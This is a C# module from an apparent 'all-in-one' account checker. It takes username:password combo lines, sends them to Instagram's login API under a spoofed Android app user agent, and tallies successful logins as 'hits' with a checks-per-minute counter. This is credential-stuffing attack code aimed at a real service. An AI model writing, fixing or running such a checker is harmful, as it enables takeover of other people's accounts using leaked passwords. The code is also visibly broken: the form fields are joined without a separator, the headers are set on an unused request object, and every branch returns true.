using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;


namespace HydraAIO.Modules
{
    internal class instagrammodule
    {
        public static bool checkinsta(string combo)
        {
            using (HttpRequest httpRequest = new HttpRequest())
            {
                string username = combo.Split(':')[0];
                string password = combo.Split(':')[1];

                string data = "email=" + username + "password=" + password;

                CookieContainer cc = new CookieContainer();
                var request2 = (HttpWebRequest)WebRequest.Create("https://i.instagram.com/api/v1/accounts/login/");

                var postdata = Encoding.ASCII.GetBytes(data);
                request2.UserAgent = "Instagram 25.0.0.26.136 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-J730F; j7y17lte; samsungexynos7870)";
                httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                httpRequest.AddHeader("Pragma", "no-cache");
                httpRequest.AddHeader("Accept", "*/*");
                httpRequest.AddHeader("Cookie2", "$Version=1");
                httpRequest.AddHeader("Accept-Language", "en-US");
                httpRequest.AddHeader("X-IG-Capabilities", "3boBAA==");
                httpRequest.AddHeader("X-IG-Connection-Type", "WIFI");
                httpRequest.AddHeader("X-IG-Connection-Speed", "-1kbps");
                httpRequest.AddHeader("X-IG-App-ID", "567067343352427");
                httpRequest.AddHeader("rur", "ATN");


                request2.ContentLength = data.Length;

                using (var stream = request2.GetRequestStream())
                {
                    stream.Write(postdata, 0, data.Length);
                }
                var response = (HttpWebResponse)request2.GetResponse();

                string html = new StreamReader(response.GetResponseStream()).ReadToEnd();
                string api = "https://i.instagram.com/api/v1/accounts/login/";

                if (html.Contains("logged_in_user"))
                {
                    ++Program.hits;
                    ++Program.cheked;
                    ++Program.cpm;
                    //Colorful.Console.WriteLine("[+] Hit - " + combo, Color.Green);
                    return true;
                }
                else
                {
                    ++Program.bad;
                    ++Program.cheked;
                    ++Program.cpm;
                    //Colorful.Console.WriteLine("[-] Bad - " + combo, Color.Red);
                    return true;
                }
            }
        }
    }
}
